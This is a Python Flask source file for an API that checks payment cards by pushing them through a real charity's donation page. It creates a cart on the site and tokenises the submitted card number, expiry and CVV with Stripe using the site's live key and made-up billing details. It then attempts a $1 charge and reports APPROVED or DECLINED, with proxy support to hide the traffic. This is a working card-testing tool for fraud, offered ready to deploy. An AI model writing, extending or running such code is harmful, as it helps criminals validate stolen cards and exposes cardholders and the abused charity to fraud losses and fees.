from flask import Flask, request, jsonify
import requests
import re

app = Flask(__name__)

class CardChecker:
    def __init__(self, proxy_url=None):
        self.session = requests.Session()
        self.proxies = self.setup_proxy(proxy_url) if proxy_url else None
    
    def setup_proxy(self, proxy_url):
        """Setup proxy"""
        try:
            if ':' in proxy_url:
                parts = proxy_url.split(':')
                if len(parts) == 4:
                    host, port, user, passw = parts
                    proxy_str = f'http://{user}:{passw}@{host}:{port}'
                else:
                    host, port = parts
                    proxy_str = f'http://{host}:{port}'
                
                return {'http': proxy_str, 'https': proxy_str}
        except:
            pass
        return None
    
    def check_card(self, cc, mm, yy, cvv):
        """Check if card can charge $1"""
        try:
            # Step 1: Get cart token
            headers = {
                'authority': 'www.onamissionkc.org',
                'accept': 'application/json',
                'content-type': 'application/json',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            cart_data = {
                'amount': {'value': 100, 'currencyCode': 'USD'},
                'donationFrequency': 'ONE_TIME',
                'feeAmount': None
            }
            
            r1 = self.session.post(
                'https://www.onamissionkc.org/api/v1/fund-service/websites/62fc11be71fa7a1da8ed62f8/donations/funds/6acfdbc6-2deb-42a5-bdf2-390f9ac5bc7b',
                json=cart_data,
                headers=headers,
                proxies=self.proxies,
                timeout=30
            )
            
            if r1.status_code != 200:
                return "DECLINED"
            
            cart_json = r1.json()
            if 'redirectUrlPath' not in cart_json:
                return "DECLINED"
            
            match = re.search(r'cartToken=([^&]+)', cart_json['redirectUrlPath'])
            if not match:
                return "DECLINED"
            
            cart_token = match.group(1)
            
            # Step 2: Create payment method
            headers = {
                'authority': 'api.stripe.com',
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36'
            }
            
            if len(yy) == 2:
                yy = '20' + yy
            
            data = {
                'billing_details[address][city]': 'Oakford',
                'billing_details[address][country]': 'US',
                'billing_details[address][line1]': 'Siles Avenue',
                'billing_details[address][postal_code]': '19053',
                'billing_details[address][state]': 'PA',
                'billing_details[name]': 'John Smith',
                'billing_details[email]': 'john@gmail.com',
                'type': 'card',
                'card[number]': cc,
                'card[cvc]': cvv,
                'card[exp_year]': yy,
                'card[exp_month]': mm,
                'key': 'pk_live_51LwocDFHMGxIu0Ep6mkR59xgelMzyuFAnVQNjVXgygtn8KWHs9afEIcCogfam0Pq6S5ADG2iLaXb1L69MINGdzuO00gFUK9D0e',
            }
            
            r2 = self.session.post(
                'https://api.stripe.com/v1/payment_methods',
                data=data,
                headers=headers,
                proxies=self.proxies,
                timeout=30
            )
            
            if r2.status_code != 200:
                return "DECLINED"
            
            payment_json = r2.json()
            if 'id' not in payment_json:
                return "DECLINED"
            
            payment_id = payment_json['id']
            
            # Step 3: Process $1 charge
            headers = {
                'authority': 'www.onamissionkc.org',
                'accept': 'application/json',
                'content-type': 'application/json',
                'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36',
                'x-csrf-token': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1'
            }
            
            cookies = {
                'crumb': 'BZuPjds1rcltODIxYmZiMzc3OGI0YjkyMDM0YzZhM2RlNDI1MWE1'
            }
            
            order_data = {
                'email': 'john@gmail.com',
                'proposedAmountDue': {'decimalValue': '1', 'currencyCode': 'USD'},
                'cartToken': cart_token,
                'paymentToken': {
                    'stripePaymentTokenType': 'PAYMENT_METHOD_ID',
                    'token': payment_id,
                    'type': 'STRIPE'
                },
                'billingAddress': {
                    'firstName': 'John',
                    'lastName': 'Smith',
                    'line1': 'Siles Avenue',
                    'city': 'Oakford',
                    'region': 'PA',
                    'postalCode': '19053',
                    'country': 'US'
                }
            }
            
            r3 = self.session.post(
                'https://www.onamissionkc.org/api/2/commerce/orders',
                json=order_data,
                headers=headers,
                cookies=cookies,
                proxies=self.proxies,
                timeout=30
            )
            
            # Check final response - site jo bole wohi return karo
            if r3.status_code == 200:
                return "APPROVED"
            else:
                return "DECLINED"
                
        except Exception as e:
            return "DECLINED"

@app.route('/check', methods=['GET'])
def check_card_api():
    """API endpoint: /check?key=BlackXCard&cc=card|mm|yy|cvv&proxy=host:port:user:pass"""
    
    # Get parameters
    key = request.args.get('key', '')
    cc_param = request.args.get('cc', '')
    proxy = request.args.get('proxy', '')
    
    # Check API key
    if key != "BlackXCard":
        return "INVALID_KEY"
    
    # Parse card details
    if '|' not in cc_param:
        return "INVALID_FORMAT"
    
    parts = cc_param.split('|')
    if len(parts) != 4:
        return "INVALID_FORMAT"
    
    cc, mm, yy, cvv = parts
    
    # Validate card
    if not all([cc, mm, yy, cvv]):
        return "MISSING_DETAILS"
    
    # Check card
    checker = CardChecker(proxy_url=proxy)
    result = checker.check_card(cc, mm, yy, cvv)
    
    # Return only APPROVED or DECLINED
    return result

@app.route('/')
def home():
    return "API Running - Use /check?key=BlackXCard&cc=card|mm|yy|cvv"

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=5000, debug=False)
